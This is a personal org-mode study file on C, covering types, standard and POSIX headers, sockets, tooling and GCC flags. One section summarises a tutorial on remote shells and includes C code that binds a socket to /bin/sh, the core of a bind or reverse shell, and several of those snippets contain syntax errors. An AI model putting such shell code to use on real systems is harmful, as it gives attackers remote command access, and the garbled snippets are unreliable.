- https://en.wikipedia.org/wiki/C_(programming_language)
  - 1972
  - by Dennis Ritchie (31)
  - Influenced by ~Algol~ and ~B~ (of Ken Thompson)
  - Loosely typed language

* Language

- no stacktraces by default
- 0 is false
- main() entry point for a program that's executed in a hosted environment
  - a *return* from it, is equivalent to calling *exit*

- Execution environments
  - freestanding: no OS, embedded programming
  - hosted: cli or from other programs

- Behavior
  1) Defined
  2) Unspecified
  3) Undefined
  4) Locale-Specific

** types

- void
- union

*** type qualifiers
- const https://softwareengineering.stackexchange.com/questions/204500/when-and-for-what-purposes-should-the-const-keyword-be-used-in-c-for-variables
|-----------------------+------------------------------------------------------------------------|
|                   <r> |                                                                        |
|                 const | unmodifiable memory                                                    |
|       static volatile | mmap Input/Output                                                      |
| static const volative | mmap Input                                                             |
|              restrict | optimization on pointers, when they are the unique point to the object |
|-----------------------+------------------------------------------------------------------------|
*** numerical / arithmetic
- Floating-point: float, double, long double
- Numerical:
  - signed char, short int, int, long int, long long int
  - *int* word can be ommited on declaration
  - <limits.h> has the maximun and minumun of each type
  - <inttypes.h> or <stdinit.h> to define uint32_t or uintmax_t
*** boolean

- defined in ~<stdbool.h>~
- _Bool (or just bool) introduced on C99, stores 0 or 1

*** char

- char, signed char, unsigned char
- all have the same alignment, size range, representation, and behavior
- satisfies a minimum et of characters aka ~basic execution character set~
- ~wchar_t~ is a chart type that takes more space (16 32 bits) to represent more chars

#+begin_src c
  char* foo = "hello" "world"; // "helloworld"
  #define STR2(x)
  #define STR(x) STR2(x)
  #define WIDTH 300
  #define HEIGHT 200
  printf("%s\n", STR(WIDTH) "x" STR(HEIGHT)); // compile time int->string casting
#+end_src

*** struct

#+begin_src c
  typedef struct { // typedef struct myStruct ?????
    unsigned char c1;
    unsigned char c2;
  } myStruct;
  myStruct _m1 = {0};
#+end_src

*** enum

#+begin_src c
  typedef enum {
    COOKIES_OREO = 0,
    COOKIES_VANILLA,
  } Cookies;

  enum RecipeType { maindish, sidedish, sweet, topping };
#+end_src

*** arrays

- globals and static are _automatically_ initialized to zero
- arrays as local, either
  #+begin_src c
    int coll2[1024] = {0};
    memset(coll2, 0, 1024);
  #+end_src
- arrays of structs
  #+begin_src c
    typedef struct {
      unsigned char a;
      unsigned char b;
      unsigned char c;
    } user_struct;
    user_struct arr[5] = {0};
  #+end_src
- arrays in structs can be initialized... TODO?

** functions
- C is a ~call-by-value~ (aka ~pass-by-value~) language
** variables
*** scopes of identifiers
|-----------+----------------------------------------------------|
|       <r> |                                                    |
|           | declared...                                        |
|-----------+----------------------------------------------------|
|      file | outside a block or param list                      |
|     block | inside a block or param list                       |
| prototype | on function prototype params                       |
|  function | on function definition, between {}, only labels(?) |
|-----------+----------------------------------------------------|
*** storage class/durations (aka lifetime of objects)
|-----------+---------+-----------------------------------------------------------------------|
|       <r> |         |                                                                       |
|           | life    | default when declared on                                              |
|-----------+---------+-----------------------------------------------------------------------|
| automatic | block   | block scope or function parameter                                     |
|    static | program | file scope, must be initialized with a constant value, NOT a variable |
|    thread |         |                                                                       |
| allocated |         | (dynamic allocated)                                                   |
|-----------+---------+-----------------------------------------------------------------------|
** functions
- list the param types or use *void* when no args
- a function with a param type list is known as a *function prototype*
** control flow
- conditionally run *statements* based on a controlling *expression*
- if/else if/else
- switch/case/default
  - expression must have an integer type
  - integer promotion is performed
    #+begin_src c
      switch (marks/10) {
        case 10: // Falls through
        case 9:
          puts("YOUR GRADE : A");
          break;
        default:
          puts("YOUR GRADE : FAILED");
      }
    #+end_src

* Standard Library

- https://en.cppreference.com/w/c/header
- https://en.wikibooks.org/wiki/Category:Book:C_Programming
- https://en.wikipedia.org/wiki/ANSI_C
- gcc/gnu extensions https://gcc.gnu.org/onlinedocs/gcc/C-Extensions.html
  - linux kernel uses them https://maskray.me/blog/2024-05-12-exploring-gnu-extensions-in-linux-kernel
  - also implemented by clang
- K&R C - 1978 - from the book with Brian Kernighan

** ANSI/ISO C89/C90
- https://en.wikipedia.org/wiki/C_data_types
- https://en.wikipedia.org/wiki/C_character_classification
- https://en.wikipedia.org/wiki/C_string_handling
- https://en.wikipedia.org/wiki/C_mathematical_functions
- https://en.wikipedia.org/wiki/C_file_input/output
- https://en.wikipedia.org/wiki/C_date_and_time_functions
- https://en.wikipedia.org/wiki/C_localization_functions
- https://en.wikipedia.org/wiki/C_dynamic_memory_allocation
- https://en.wikipedia.org/wiki/C_process_control
- https://en.wikipedia.org/wiki/C_signal_handling
- https://en.wikipedia.org/wiki/C_alternative_tokens
- assert(0 && "TODO: description");
|----------+--------------+-----------------------------------------------------------------|
|      <r> |     <c>      |                                                                 |
|   HEADER |      fn      |                                                                 |
|----------+--------------+-----------------------------------------------------------------|
| assert.h |    assert    | Conditionally compiled macro that compares its argument to zero |
|  ctype.h |              | Functions to determine the type contained in ~character~ data   |
|  errno.h |              | Macros reporting error conditions                               |
|  float.h |              | Limits of floating-point types                                  |
|   time.h |              | Time/date utilities                                             |
| limits.h |              | Ranges of integer types                                         |
| locale.h |              | Localization utilities                                          |
|   [[https://en.wikibooks.org/wiki/C_Programming/math.h][math.h]] |     fabs     | Common mathematics functions                                    |
|  paths.h |              | constants with string paths of common LINUX files               |
| setjmp.h |              | Nonlocal jumps                                                  |
| signal.h |              | Signal handling                                                 |
| stdarg.h |              | Allows variable arguments functions                             |
|----------+--------------+-----------------------------------------------------------------|
| stddef.h |     NULL     | Common macro definitions                                        |
|          |    size_t    |                                                                 |
|----------+--------------+-----------------------------------------------------------------|
|  [[https://en.wikibooks.org/wiki/C_Programming/stdio.h][stdio.h]] |              | Input/output. Most return EOF (-1) on error.                    |
|          |    fopen     | open a stream                                                   |
|          |    fclose    | close a stream                                                  |
|          |    fread     | reads from stream, elements not bytes                           |
|          |    fgetc     | reads int character from stream                                 |
|          |    fwrite    | writes into stream                                              |
|          |   fprintf    | writes into stream                                              |
|          |    printf    | returns the nr of chars printed, or negative number on error    |
|          |   getchar    |                                                                 |
|          |    scanf     |                                                                 |
|          |     puts     |                                                                 |
|          |    remove    | erases a file                                                   |
|          |    rename    | renames a file                                                  |
|          |   tmpfile    | pointer to tmp file                                             |
|----------+--------------+-----------------------------------------------------------------|
| [[https://en.wikibooks.org/wiki/C_Programming/stdlib.h][stdlib.h]] |              | General utilities                                               |
|          |    size_t    |                                                                 |
|          |    malloc    |                                                                 |
|          |    getenv    |                                                                 |
|          |    system    |                                                                 |
|          |     exit     |                                                                 |
|          |   bsearch    |                                                                 |
|          |    qsort     |                                                                 |
|          |     abs      |                                                                 |
|          |     div      |                                                                 |
|          |    random    |                                                                 |
|          |     ato?     |                                                                 |
|          |    strto?    |                                                                 |
|          |    abort     | cause abnomal process termination                               |
|          | EXIT_SUCCESS |                                                                 |
|          | EXIT_FAILURE |                                                                 |
|----------+--------------+-----------------------------------------------------------------|
| [[https://en.wikibooks.org/wiki/C_Programming/string.h][string.h]] |    size_t    | String handling                                                 |
|          |    memcpy    |                                                                 |
|----------+--------------+-----------------------------------------------------------------|
** ANSI/ISO C95
|----------+---+------------------------------------------------------------------|
|      <r> |   |                                                                  |
| iso646.h |   | Alternative operator spellings                                   |
|  wchar.h |   | Extended multibyte and wide character utilities                  |
| wctype.h |   | Functions to determine the type contained in wide character data |
|----------+---+------------------------------------------------------------------|
** ANSI/ISO C99/C9X
- https://en.wikipedia.org/wiki/C99
*** features

- inline for functions
- ~compound literals~, where rational is a typedef struct with 2 members
  #+begin_src c
    (rational){1,2}
    (int [m]){8,6,3,1,2,3,4,5,6}
    (int []){8,6,3,1,2,3,4,5,6}
  #+end_src
- ~designated initializers~, nice for unions or structs (to avoid confusion) or arrays
  #+begin_src c
    glop g1 = { .i = 10}
    glop g2 = { .d = 12.3 }
    int x[10] = { 0, 0, 0, 8, 0, 0, 0,  2}
    int x[10] = { [3] = 8, [7] = 2 }
  #+end_src
- ~variable length arrays~ VLAs, declaring and as parameters
  #+begin_src c
    void f(size_t m, size_t n) {
      int x[m][n];
  #+end_src
- ~flexible array members~, useful for packet-like structures
  #+begin_src c
    struct packet {
      header h;
      data d[]; // THIS
    }
  #+end_src

*** headers
|------------+-------------+----------------------------------------------------------|
|        <r> |     <c>     |                                                          |
|  complex.h |             | ~Complex number~ arithmetic                              |
|     fenv.h |             | Floating-point environment                               |
| inttypes.h |             | Format conversion of integer types                       |
|   tgmath.h |             | Type-generic math (macros wrapping math.h and complex.h) |
|  stdbool.h |             | Macros for boolean type                                  |
|   [[https://en.wikibooks.org/wiki/C_Programming/stdint.h][stdint.h]] | [u]int<n>_t | Fixed-width integer types                                |
|            | INT<n>_MAX  |                                                          |
|------------+-------------+----------------------------------------------------------|
** ANSI/ISO C11/C1X
https://en.wikipedia.org/wiki/C11_(C_standard_revision)
|---------------+---+----------------------------------------|
|           <r> |   |                                        |
|    stdalign.h |   | alignas and alignof convenience macros |
|   stdatomic.h |   | Atomic operations                      |
| stdnoreturn.h |   | noreturn convenience macro             |
|     threads.h |   | Thread library                         |
|       uchar.h |   | UTF-16 and UTF-32 character utilities  |
|---------------+---+----------------------------------------|
** ANSI/ISO C17/C18
- https://en.wikipedia.org/wiki/C17_(C_standard_revision)
- bugfix of C11
** ANSI/ISO C23
https://en.wikipedia.org/wiki/C23_(C_standard_revision)
|-------------+---+---------------------------------------------------------------|
|         <r> |   |                                                               |
|    stdbit.h |   | macros to work with the byte and bit representations of types |
| stdckdint.h |   | macros for performing checked integer arithmetic              |
|-------------+---+---------------------------------------------------------------|
** POSIX
- Portable Opearting System Interface (for UNIX)
- https://en.wikipedia.org/wiki/POSIX
  - POSIX.1-2024
    - https://sortix.org/blog/posix-2024/
    - https://blog.toast.cafe/posix2024-xcu
- https://en.wikipedia.org/wiki/C_POSIX_library
- https://en.wikibooks.org/wiki/C_Programming/POSIX_Reference
- libc's compare http://www.etalabs.net/compare_libcs.html
- history https://www.usenix.org/publications/loginonline/transcending-posix-end-era
- adds functions specific to POSIX systems
- sys/wait.h
  - waits for state changes in a child of the calling process
  - returns the pid of the process that changed state
|----------------+--------------------------------------------------|
|      <c>       |                                                  |
|     aio.h      | Asynchronous input and output.                   |
|    fmtmsg.h    | Message display structures.                      |
|    iconv.h     | Codeset conversion facility.                     |
|   langinfo.h   | Language information constants.                  |
|    libgen.h    | Definitions for pattern matching functions.      |
|   monetary.h   | Monetary types.                                  |
|    mqueue.h    | Message queues (REALTIME).                       |
|     ndbm.h     | Definitions for ndbm database operations.        |
|    netdb.h     | Definitions for network database operations.     |
|   nl_types.h   | Data types.                                      |
|     poll.h     | Definitions for the poll() function.             |
|    regex.h     | Regular expression matching types.               |
|    sched.h     | Execution scheduling.                            |
|   strings.h    | String operations.                               |
|   stropts.h    | STREAMS interface (STREAMS).                     |
|   sys/mman.h   | POSIX memory management declarations.            |
| sys/resource.h | Definitions for XSI resource operations.         |
|  sys/select.h  | Select types.                                    |
|   sys/shm.h    | XSI shared memory facility.                      |
| sys/statvfs.h  | VFS File System information structure.           |
|   sys/time.h   | Time and date functions and structures.          |
|  sys/types.h   | Various data types used elsewhere.               |
|   sys/uio.h    | Definitions for vector I/O operations.           |
| sys/utsname.h  | uname and related structures.                    |
|    syslog.h    | Definitions for system error logging.            |
|   termios.h    | Allows terminal I/O interfaces.                  |
|    trace.h     | Tracing.                                         |
|    unistd.h    | Various essential POSIX functions and constants. |
|   wordexp.h    | Word-expansion types.                            |
|----------------+--------------------------------------------------|
*** account
|---------+-----------------------------------------------|
| grp.h   | User group information and control.           |
| pwd.h   | Passwd (user information) access and control. |
| utmpx.h | User accounting database definitions.         |
|---------+-----------------------------------------------|
*** datastructure
|-------------+-----------------------|
| search.h    | Search tables.        |
| semaphore.h | Semaphores.           |
| sys/sem.h   | POSIX semaphores.     |
| sys/msg.h   | POSIX message queues. |
|-------------+-----------------------|
*** file format
|--------+--------------------------------------------|
| cpio.h | Magic numbers for the cpio archive format. |
| tar.h  | Magic numbers for the tar archive format.  |
|--------+--------------------------------------------|
*** filesystem
|-------------+------------------------------------------------|
|     <c>     |                                                |
|  [[https://en.wikibooks.org/wiki/C_Programming/POSIX_Reference/dirent.h][dirent.h]]   | Allows the opening and listing of directories. |
|   fcntl.h   | File opening, locking and other operations.    |
|  fnmatch.h  | Filename-matching types.                       |
|    ftw.h    | File tree traversal.                           |
|   glob.h    | Pathname pattern-matching types.               |
| [[https://en.wikibooks.org/wiki/C_Programming/POSIX_Reference/sys/stat.h][sys/stat.h]]  | File information (stat et al.).                |
| sys/times.h | File access and modification times structure.  |
|   [[https://en.wikibooks.org/wiki/C_Programming/POSIX_Reference/utime.h][utime.h]]   | File access and modification times.            |
|-------------+------------------------------------------------|
*** network
|---------------+-------------------------------------------------------------------|
|      <c>      |                                                                   |
|  arpa/inet.h  | Definitions for internet operations.                              |
|   net/if.h    | Sockets local interfaces.                                         |
| netinet/in.h  | Internet address family.                                          |
| netinet/tcp.h | Definitions for the Internet Transmission Control Protocol (TCP). |
| sys/socket.h  | Main sockets header.                                              |
|   sys/un.h    | Definitions for UNIX domain sockets.                              |
|---------------+-------------------------------------------------------------------|
*** process
|------------+-------------------------------------------------------------|
|    <c>     |                                                             |
| pthread.h  | Defines an API for creating and manipulating POSIX threads. |
|  spawn.h   | Create a new process to run an executable program.          |
| sys/ipc.h  | Inter-process communication (IPC).                          |
| sys/wait.h | Status of terminated child processes.                       |
|  ulimit.h  | ulimit commands.                                            |
|------------+-------------------------------------------------------------|
*** <unistd.h>
https://en.wikibooks.org/wiki/C_Programming/POSIX_Reference/unistd.h
- close
- [[https://en.wikibooks.org/wiki/C_Programming/POSIX_Reference/unistd.h/exec][exec]](vp)
  - the "p" means that it will look into PATH
  - replaces the current process image with the one passed to it
  - you NEED to run in on a fork()ed child
  - 2nd argument list must end with NULL
- [[https://en.wikibooks.org/wiki/C_Programming/POSIX_Reference/unistd.h/fork][fork]]
  - returns
    - to the parent the child id
    - to the child 0
    - or negative on error
- open
- read
- select
- sleep
- swab
- write
** Windows
- MSVCRT.DLL -> UCRTBASE.DLL (C99-ish) https://en.wikipedia.org/wiki/Microsoft_Windows_library_files#Runtime_libraries
- sockets https://en.wikipedia.org/wiki/Winsock
** sockets
*** basic

- CLIENT
  s = socket()
  opts = htons+inet_addr
  connect(s, opts)

- SERVER
  s = socket()
  opts = htons+htonl
  bind(s, opts)
  listen(s, BACKLOG)
  accept(s) // wait

*** 0x00sec - Remote Shells
****   I Use Cases
https://0x00sec.org/t/remote-shells-part-i/269/1

- Remote Access:
  In the cases when is NOT possible to deploy a service like "ssh" or "telnet"
  you can easily write your own remote shell program.

- Types of Remote Shells
  - Direct: act like servers
  - Reverse: the application "calls back home" to a specifict server/port

**** client

#+begin_src c
  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>
  #include <sys/socket.h>
  #include <arpa/inet.h>

  int client_init(char *ip, int port) {
    int s;
    if ((s = socket(AF_INET; SOCK_STREAM, 0) < 0) {
        perror("socket:");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in serv;
    serv.sin_family = AF_INET;
    serv.sin_port = htons(port);
    serv.sin_addr.s_s_addr = inet_addr(ip);
    if (connect(s, (struct sockaddr *)&serv, sizeof(serv)) < 0) {
      perror("connect:");
      exit(EXIT_FAILURE);
    }

    return s;
  }
#+end_src

**** server

#+begin_src c
  inet server_init(int port) {
    int s;
    if ((s = socket(AF_INET, SOCK_STREAM, 0) < 0)) {
      perror("socket:");
      exit(EXIT_FAILURE);
    }

    struct sockaddr_in serv;
    serv.sin_family = AF_INET;
    serv.sin_port = htons(port);
    serv.sin_addr.s_addr = htonl(INADDR_ANY);
    if ((bind(s, (struct sockaddr *)&serv, sizeof(struct sockaddr_in))) < 0) {
      perror("bind:");
      exit(EXIT_FAILURE);
    }
    if ((listen(s, 10)) < 0) {
      perror("listen:");
      exit(EXIT_FAILURE);
    }

    socklen_t clen = sizeof(struct sockaddr_in);
    struct sockaddr_in client;
    int s1;
    if ((s1 = accept(s, (struct sockaddr *) &client, &clen)) < 0) {
      perror("accept:");
      exit(EXIT_FAILURE);
    }
    return s1;
  }
#+end_src

**** start_shell

#+begin_src c
  int start_shell(int s) {
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);
    char *name[3];
    name[0] = "/bin/sh";
    name[1] = "-i";
    name[2] = NULL;
    execve(name[0], name);
    exit(1);
    return 0;
  }
#+end_src

****  II Crypt your link
- https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306
- https://en.wikipedia.org/wiki/Loop_unrolling

- SocketPair
  - Used to transfer data
  - Are a pair of sockets that are immediatly connected
    Something like runing a client and a server in 1 call
  - Kind of like a bidirectional PIPE
  - Convenient IPC

- secure_shell()
  | Parent       | Child              |
  |--------------+--------------------|
  | socketpair() |                    |
  | fork()       | fork()             |
  | close(sp[0]) | close(sp[1])       |
  | async_read() | start_shell(sp[0]) |

- async_read()
  select()
  memset()
  read()
  memfrob()

- We use stdin socket as the input socket for async_read() on main()

**** III Shell Access your Phone
- setsockopt() - SO_REUSEADDR

* (in)security
- banned stdlib functions in git source https://github.com/git/git/blob/master/banned.h
- Passing user supplied data to ~printf~ first/format argument, can result in a security vulnerability
- A Guide to Undefined Behavior in C and C++, Part 1
  https://blog.regehr.org/archives/213
- https://github.com/microsoft/checkedc
- https://fastcompression.blogspot.com/2019/01/writing-safer-c-code.html
- https://github.com/gerasdf/InsecureProgramming/
- https://github.com/hardik05/Damn_Vulnerable_C_Program
** Sanitizers
- asan, ubsan, valgrind, fuzzers, libcheck, pvs
- https://tek256.com/posts/code-hardening/
- Static http://splint.org/
- https://www.youtube.com/watch?v=Q2C2lP8_tNE
- https://github.com/google/sanitizers/wiki/AddressSanitizer
- https://valgrind.org/docs/manual/quick-start.html
- https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html
* Tools
- cscout [[https://github.com/dspinellis/cscout][source]] [[https://www.spinellis.gr/cscout/][home]]
- clang-format
  - https://emacs.stackexchange.com/questions/55635/how-can-i-set-up-clang-format-in-emacs
    clang-format -style=llvm -dump-config > .clang-format
** Editors
- emacs
  - http://blog.lujun9972.win/emacs-document/blog/2018/03/22/emacs-as-a-c++-ide/index.html
  - https://vxlabs.com/2016/04/11/step-by-step-guide-to-c-navigation-and-completion-with-emacs-and-the-clang-based-rtags/
- clangd
  - autoformat configuration options https://bcain-llvm.readthedocs.io/projects/clang/en/latest/ClangFormatStyleOptions/
  - vim https://github.com/rhysd/vim-clang-format
- Visual Studio https://visualstudio.microsoft.com/
- Eclipse CDT https://projects.eclipse.org/projects/tools.cdt
- CLion https://www.jetbrains.com/clion/
  - Paid
- Code::Blocks https://www.codeblocks.org/
  - 2020 last version
** Compilers
- gcc https://gcc.gnu.org/
- clang https://clang.llvm.org/
- tcc
  - http://www.tendra.org/tdfc2-config/#S11.2
  - https://github.com/tendra/tendra/wiki/About
* Benchmarks
- Benchmark: https://www.wilfred.me.uk/blog/2014/10/20/the-fastest-bigint-in-the-west/
- Benchmark: FFI https://github.com/dyu/ffi-overhead
  - Golang is 40x slower than C
  - Haskell,Ocaml(opt),Rust are on par with C
  - Ocaml(C) is 4x slower
  - LuaJit is faster than C, https://github.com/dyu/ffi-overhead/issues/2#issuecomment-405834411
    "Using JITing to skip PLT inderection"
    "Same on C would be -fno-plt"
* Gotchas
- ME: (like bash) small differences can make a lot
* GCC
|--------------------------+---------------------------|
| -pedantic                | notify portability issues |
| -std=                    | c89,c90,c99...            |
| -ansi                    | -std=c90                  |
| -Wmisleading-indentation | when not using braces     |
| -Wimplicit-fallthrough   |                           |
| -Wswitch-enum            |                           |
|--------------------------+---------------------------|
